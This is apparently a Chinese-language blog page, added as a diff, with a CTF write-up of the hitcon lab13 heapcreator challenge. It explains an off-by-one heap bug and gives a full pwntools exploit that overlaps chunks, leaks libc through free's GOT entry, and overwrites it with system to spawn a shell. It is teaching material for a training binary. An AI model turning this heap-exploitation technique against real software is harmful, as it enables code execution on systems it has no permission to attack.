@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="上个文章写了chunk extend&#x2F;overappling，这个文章学习一下例题，实战一下 题目地址：https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;blob&#x2F;master&#x2F;pwn&#x2F;heap&#x2F;chunk-extend-shrink&#x2F;hitcontraning_lab13&#x2F;heapcreator.c  分析源码  因为有源码，直接看吧，就不IDA了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="chunk extend&#x2F;overappling例题">
+<meta property="og:url" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="上个文章写了chunk extend&#x2F;overappling，这个文章学习一下例题，实战一下 题目地址：https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;blob&#x2F;master&#x2F;pwn&#x2F;heap&#x2F;chunk-extend-shrink&#x2F;hitcontraning_lab13&#x2F;heapcreator.c  分析源码  因为有源码，直接看吧，就不IDA了">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/2.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/1.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/3.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/4.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/5.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/6.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/7.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/8.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/9.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/10.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/11.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/12.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/13.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/14.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/15.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/16.png">
+<meta property="og:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/17.png">
+<meta property="article:published_time" content="2021-09-30T02:49:38.000Z">
+<meta property="article:modified_time" content="2022-05-06T00:48:31.334Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/2.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>chunk extend/overappling例题</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/09/30/UseAfter-Free/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/09/30/chunk-extend-overlapping/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&text=chunk extend/overappling例题"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&title=chunk extend/overappling例题"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&is_video=false&description=chunk extend/overappling例题"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=chunk extend/overappling例题&body=Check out this article: http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&title=chunk extend/overappling例题"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&title=chunk extend/overappling例题"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&title=chunk extend/overappling例题"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&title=chunk extend/overappling例题"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&name=chunk extend/overappling例题&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&t=chunk extend/overappling例题"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">分析源码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#create-heap"><span class="toc-number">1.1.</span> <span class="toc-text">create_heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit-heap"><span class="toc-number">1.2.</span> <span class="toc-text">edit_heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#show-heap"><span class="toc-number">1.3.</span> <span class="toc-text">show_heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete-heap"><span class="toc-number">1.4.</span> <span class="toc-text">delete_heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#struct%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.5.</span> <span class="toc-text">struct结构体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99exp"><span class="toc-number">3.</span> <span class="toc-text">编写exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84"><span class="toc-number">3.1.</span> <span class="toc-text">内存结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91off-by-one%E6%BC%8F%E6%B4%9E%E5%AE%8C%E6%88%90Extend"><span class="toc-number">3.2.</span> <span class="toc-text">触发off-by-one漏洞完成Extend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B8%BAgetshell%E5%81%9A%E5%87%86%E5%A4%87"><span class="toc-number">3.3.</span> <span class="toc-text">泄露函数，为getshell做准备</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        chunk extend/overappling例题
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-09-30T02:49:38.000Z" itemprop="datePublished">2021-09-30</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E9%A2%98%E7%9B%AE/">题目</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>上个文章写了chunk extend&#x2F;overappling，这个文章学习一下例题，实战一下</p>
+<p>题目地址：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13/heapcreator.c">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13/heapcreator.c</a></p>
+</blockquote>
+<h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><font size="4">
+
+<p>因为有源码，直接看吧，就不IDA了。。。。但是还是得看一下保护，一看可以改got表。</p>
+<p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/2.png"></p>
+<h3 id="create-heap"><a href="#create-heap" class="headerlink" title="create_heap"></a>create_heap</h3><p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/1.png"></p>
+<blockquote>
+<p>这个源码看上去比IDA好分析多了（可能是我太弱</p>
+</blockquote>
+<p>这个功能就是创建一个堆，直接上自动化代码吧。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Size of Heap : &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content of heap:&#x27;</span>, content)</span><br></pre></td></tr></table></figure>
+
+<h3 id="edit-heap"><a href="#edit-heap" class="headerlink" title="edit_heap"></a>edit_heap</h3><p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/3.png"></p>
+<blockquote>
+<p>这个功能简单一看没有什么问题，但是第74行的size后面加了一个1，有点奇怪，跟进看一下read_input函数</p>
+</blockquote>
+<p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/4.png"></p>
+<blockquote>
+<p>这不是off-by-one吗？</p>
+</blockquote>
+<h3 id="show-heap"><a href="#show-heap" class="headerlink" title="show_heap"></a>show_heap</h3><p>没有什么特别的，直接（上</p>
+<p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/5.png"></p>
+<p>看自动化函数吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure>
+
+<h3 id="delete-heap"><a href="#delete-heap" class="headerlink" title="delete_heap"></a>delete_heap</h3><p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/6.png"></p>
+<blockquote>
+<p>把heaparry的指针给清0了直接上自动化</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure>
+
+<h3 id="struct结构体"><a href="#struct结构体" class="headerlink" title="struct结构体"></a>struct结构体</h3><p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/7.png"></p>
+<h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>分析完上面的源码，有一个off-by-null，它溢出的部分正好是下一个chunk的size部分，触发off-by-one漏洞完成Extend，泄露libc_base，将free替换成system，释放带有binsh的堆，即可完成getshell</p>
+<h2 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h2><h3 id="内存结构"><a href="#内存结构" class="headerlink" title="内存结构"></a>内存结构</h3><p>先创建两个chunk看看是怎么回事吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>, <span class="string">&#x27;aaaa\n&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">&#x27;bbbb\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/8.png"></p>
+<p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/9.png"></p>
+<blockquote>
+<p>可以看到结构很清楚，heap_ptr里面有size和content的地址，content的地址里放着数据</p>
+</blockquote>
+<h3 id="触发off-by-one漏洞完成Extend"><a href="#触发off-by-one漏洞完成Extend" class="headerlink" title="触发off-by-one漏洞完成Extend"></a>触发off-by-one漏洞完成Extend</h3><p>这一步很重要，先从浅层看这个问题，我们修改的其实是heap内容的chunk而不是结构体本身的chunk，也就是说如果我们修改heap0的内容，如果触发off-by-one的话那影响的应该是heap1的结构体，再从深层看这个问题，在堆中如果低地址的块处于使用状态，那么相邻高地址的块的prev_size可以作为低地址块的data来使用</p>
+<blockquote>
+<p>所以当我们创建第一个heap的时候将大小写成0x18，这样在使用的时候heap0的content的数据，假如要填满，会写到heap1_ptr的pre_size中。再次修改时，加上一个off-by-one，既可溢出到heap1_ptr的size</p>
+</blockquote>
+<p>直接上dbg（刚开始做题目忘记关alsr了</p>
+<p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/10.png"></p>
+<blockquote>
+<p>可以看到content被填满了，假如现在edit，将content再次填满那蓝色框里面的size就会被覆盖。</p>
+</blockquote>
+<p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/11.png"></p>
+<blockquote>
+<p>可以看到蓝色框里已经被覆盖成了其他数，因为我刚刚又填了一个a（所以你懂的</p>
+</blockquote>
+<p>接下来就so easy了，开始构造payload。如果我们将size的值覆盖成0x41的话，在释放时heap1结构体和heap1_content就会合并成一个0x40的块，重新申请之后就可以进一步操作了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + <span class="string">b&#x27;\x41&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/12.png"></p>
+<blockquote>
+<p>其实p1还可以这样构造p1 &#x3D; b’&#x2F;bin&#x2F;sh\x00’ + ‘aaaaaaaaaaaaaaaa’ + b’\x41’，可以把前面的0x18个字节给利用起来</p>
+</blockquote>
+<p>接下来就要和chunk extend&#x2F;overappling的基础一样，要释放掉chunk2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/13.png"></p>
+<blockquote>
+<p>可以看到heap1_ptr和heap1_content已经合并在一起并被释放了，接下来要做的就是再次申请</p>
+</blockquote>
+<h3 id="泄露函数，为getshell做准备"><a href="#泄露函数，为getshell做准备" class="headerlink" title="泄露函数，为getshell做准备"></a>泄露函数，为getshell做准备</h3><p>通过前面的努力我们已经完成了如下步骤：</p>
+<ul>
+<li>通过off-by-one漏洞完成修改heap1结构体chunk的size值</li>
+<li>成功extent heap1内容chunk</li>
+</ul>
+<p>接下来比较重要，因为源代码是以heap_ptr先创建，最后才是heap_content，而heap_ptr最多只要0x20就够了，我们先看一下delete之后的bin</p>
+<p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/14.png"></p>
+<blockquote>
+<p>因为先申请heap_ptr，而heap_ptr只要0x20，所以是先将0x603060用来申请ptr，申请完成之后就是heap_content为0x603040，所以heap_content就会在heap_ptr的前面，creat的时候就可以直接控制heap_ptr（直接开始写payload2</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p2 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x30</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">create(<span class="number">0x30</span>, p2)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/15.png"></p>
+<blockquote>
+<p>接下来就可以直接show了，因为free_got已经被写进去了，再通过libc_base就可以计算出system</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/16.png"></p>
+<p>直接一把</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">free_addr = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;free_addr = &#x27;</span> + <span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc_base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>因为heap1_ptr里面的content的地址被换成了free_got的地址，所以我们再次修改heap1_content就是修改的free_got</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/17.png"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;z1r0&#x27;</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = reomte()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(<span class="string">&#x27;./z1r0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./z1r0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./2.23/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&#x27;Your choice :&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Size of Heap : &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content of heap:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content of heap : &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">&#x27;bbbb\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + <span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p1)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x30</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">create(<span class="number">0x30</span>, p2)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;free_addr = &#x27;</span> + <span class="built_in">hex</span>(free_addr))</span><br><span class="line"></span><br><span class="line">libc_base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+</font>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
